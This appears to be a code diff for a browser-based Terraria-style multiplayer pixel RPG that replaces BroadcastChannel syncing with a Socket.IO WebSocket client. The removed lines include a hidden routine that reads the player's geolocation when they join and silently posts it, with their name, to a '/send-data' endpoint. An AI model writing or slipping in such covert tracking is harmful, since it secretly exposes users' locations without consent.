@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚔️ Terraria-Style Multiplayer Pixel RPG</title>
+    <title>⚔️ Terraria-Style Multiplayer WebSocket RPG</title>
+    <!-- Socket.IO Client Library CDN -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         * {
             box-sizing: border-box;
@@ -136,10 +138,10 @@
     <!-- START MENU SCREEN -->
     <div id="title-screen" class="screen active">
         <h1>TERRA-QUEST MMO</h1>
-        <p>Terraria-Inspired 2D Pixel Multiplayer Overworld RPG</p>
+        <p>Live WebSocket Multiplayer Terraria Overworld RPG</p>
         <input id="name-input" maxlength="15" placeholder="Hero Name..." /><br>
-        <input id="room-input" maxlength="15" placeholder="Server / Room ID (e.g. alpha)" value="main-room" /><br>
-        <button class="pixel-btn" onclick="joinGameServer()">JOIN WORLD</button>
+        <input id="room-input" maxlength="15" placeholder="Server Room (e.g. alpha)" value="main" /><br>
+        <button class="pixel-btn" onclick="connectToServer()">JOIN WORLD</button>
     </div>
 
     <!-- HUD OVERLAYS -->
@@ -154,13 +156,14 @@
     </div>
 
     <div id="controls-hint" class="controls-overlay">
-        Move: <b>A / D</b> or <b>Left / Right</b> &nbsp;|&nbsp; Jump: <b>W, Space, Up</b> &nbsp;|&nbsp; See real-time online players moving in the world!
+        Move: <b>A / D</b> or <b>Left / Right</b> &nbsp;|&nbsp; Jump: <b>W, Space, Up</b> &nbsp;|&nbsp; See connected online players live!
     </div>
 
     <!-- MAIN GAME CANVAS -->
     <canvas id="game-canvas"></canvas>
 
     <script>
+        const socket = io();
         const titleScreen = document.getElementById('title-screen');
         const hud = document.getElementById('hud');
         const controlsHint = document.getElementById('controls-hint');
@@ -191,10 +194,9 @@
         let entities = []; 
         let particles = []; 
         let remotePlayers = {}; 
-        let currentRoom = 'main-room';
+        let currentRoom = 'main';
 
         let hero = {
-            id: 'p_' + Math.random().toString(36).substring(2, 9),
             name: 'Hero',
             x: 100,
             y: 100,
@@ -218,9 +220,7 @@
             atk: 15
         };
 
-        let netChannel = null;
-
-        function joinGameServer() {
+        function connectToServer() {
             let name = nameInput.value.trim();
             if (name) hero.name = name;
             let room = roomInput.value.trim().toLowerCase();
@@ -229,39 +229,7 @@
             document.getElementById('hud-name').textContent = hero.name;
             document.getElementById('hud-room').textContent = currentRoom;
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        fetch('/send-data', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude,
-                                name: hero.name
-                            })
-                        }).catch(() => {});
-                    },
-                    () => {}
-                );
-            }
-
-            if (window.BroadcastChannel) {
-                netChannel = new BroadcastChannel('terra_quest_mmo_' + currentRoom);
-                netChannel.onmessage = (event) => {
-                    let data = event.data;
-                    if (data && data.id && data.id !== hero.id) {
-                        remotePlayers[data.id] = {
-                            name: data.name,
-                            x: data.x,
-                            y: data.y,
-                            facing: data.facing,
-                            frame: data.frame,
-                            lastSeen: Date.now()
-                        };
-                    }
-                };
-            }
+            socket.emit('join_server', { name: hero.name, room: currentRoom });
 
             generateTerrain();
             titleScreen.classList.remove('active');
@@ -270,6 +238,26 @@
 
             requestAnimationFrame(gameLoop);
         }
+
+        // Socket Event Listeners
+        socket.on('current_players', (players) => {
+            remotePlayers = players;
+            if (socket.id && remotePlayers[socket.id]) {
+                delete remotePlayers[socket.id];
+            }
+        });
+
+        socket.on('player_joined', (player) => {
+            remotePlayers[player.id] = player;
+        });
+
+        socket.on('player_moved', (player) => {
+            remotePlayers[player.id] = player;
+        });
+
+        socket.on('player_left', (data) => {
+            delete remotePlayers[data.id];
+        });
 
         function generateTerrain() {
             worldMap = [];
@@ -410,24 +398,17 @@
                 hero.frame = 0;
             }
 
+            // Emit coordinates via WebSocket to server
             netSyncCounter++;
-            if (netSyncCounter > 3 && netChannel) {
-                netChannel.postMessage({
-                    id: hero.id,
-                    name: hero.name,
+            if (netSyncCounter > 2) {
+                socket.emit('player_update', {
+                    room: currentRoom,
                     x: hero.x,
                     y: hero.y,
                     facing: hero.facing,
                     frame: hero.frame
                 });
                 netSyncCounter = 0;
-            }
-
-            let now = Date.now();
-            for (let id in remotePlayers) {
-                if (now - remotePlayers[id].lastSeen > 4000) {
-                    delete remotePlayers[id];
-                }
             }
 
             for (let i = entities.length - 1; i >= 0; i--) {
@@ -584,6 +565,7 @@
                 }
             });
 
+            // Draw Remote Multiplayer Players via WebSockets
             for (let id in remotePlayers) {
                 let rp = remotePlayers[id];
                 let rpx = Math.floor(rp.x);
@@ -601,6 +583,7 @@
                 ctx.fillRect(rpx + 3, rpy, 16, 10);
             }
 
+            // Draw Local Hero Sprite
             let hx = Math.floor(hero.x);
             let hy = Math.floor(hero.y);
 
